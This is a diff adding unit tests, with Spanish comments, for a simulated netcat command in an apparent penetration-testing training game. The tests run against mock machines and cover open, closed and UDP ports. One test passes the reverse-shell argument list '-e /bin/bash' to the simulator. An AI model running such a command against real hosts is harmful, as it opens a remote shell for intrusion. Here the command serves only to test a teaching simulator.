@@ -136,4 +136,58 @@ describe('cmd_nc', () => {
     const result = cmd_nc.execute(['example.com'], ctxNoListener);
     expect(result.isError).toBe(true);
   });
+
+  // ── Conexión por estado de puerto (P1 realismo) ──
+  const webTarget: Machine = {
+    id: 'web-01',
+    machine_info: { hostname: 'web', ip: '192.168.20.12', mac: '00:00:00:00:00:02', os: 'Ubuntu 22.04', status: 'up', type: 'server' },
+    discovery_level: 2,
+    scan_results: {
+      ports: [
+        { port: 80, protocol: 'tcp', state: 'open', service: 'http', version: 'Apache 2.4' },
+        { port: 22, protocol: 'tcp', state: 'closed', service: 'ssh', version: '' },
+      ],
+    },
+    web_enumeration: { web_server: 'Apache', cms: 'none', directories: [] },
+    learning_steps: [],
+    files: [],
+  };
+
+  const ctxWeb: CommandContext = {
+    machine: mockMachine,
+    allMachines: [mockMachine, webTarget],
+    currentMissionId: 1,
+    currentDir: '/',
+  };
+
+  it('debe conectar a puerto abierto de host conocido', () => {
+    const result = cmd_nc.execute(['192.168.20.12', '80'], ctxWeb);
+    expect(result.isError).toBeFalsy();
+    expect(result.output).toContain('succeeded');
+    expect(result.output).toContain('192.168.20.12');
+  });
+
+  it('debe rechazar puerto cerrado de host conocido', () => {
+    const result = cmd_nc.execute(['192.168.20.12', '22'], ctxWeb);
+    expect(result.isError).toBe(true);
+    expect(result.output).toContain('refused');
+  });
+
+  it('debe aceptar -e con payload de reverse shell', () => {
+    const result = cmd_nc.execute(['-e', '/bin/bash', '192.168.20.12', '80'], ctxWeb);
+    expect(result.isError).toBeFalsy();
+    expect(result.output).toContain('succeeded');
+  });
+
+  it('debe conectar en modo UDP a host conocido', () => {
+    const result = cmd_nc.execute(['-u', '192.168.20.12', '53'], ctxWeb);
+    expect(result.isError).toBeFalsy();
+    expect(result.output).toContain('[udp/');
+  });
+
+  it('debe rechazar puerto no numérico en conexión', () => {
+    const result = cmd_nc.execute(['192.168.20.12', 'abc'], ctxWeb);
+    expect(result.isError).toBe(true);
+    expect(result.output).toContain('bad port');
+  });
 });
